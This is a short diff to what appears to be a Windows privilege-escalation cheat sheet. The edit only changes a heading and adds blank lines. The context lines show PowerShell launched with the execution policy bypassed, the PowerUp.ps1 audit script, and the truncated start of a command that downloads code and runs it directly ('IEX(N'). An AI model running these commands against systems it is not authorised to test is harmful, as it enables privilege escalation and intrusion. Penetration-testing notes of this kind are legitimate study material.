@@ -5,7 +5,7 @@ c:> powershell.exe -nop -exec bypass
 PS C:> ./PowerUp.ps1
 PS C:> Invoke-AllChecks
 ```
-# From url
+## From url
 ```
 c:> powershell.exe -nop -exec bypass
 PS c:> Import-MOdule ./PowerUp.ps1
@@ -17,6 +17,8 @@ powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile "IEX(N
 
 c:\users\kosts\Desktop> .\wp.exe
 ```
+
+
 # Manual info gathering
 ## Operating System
 ```
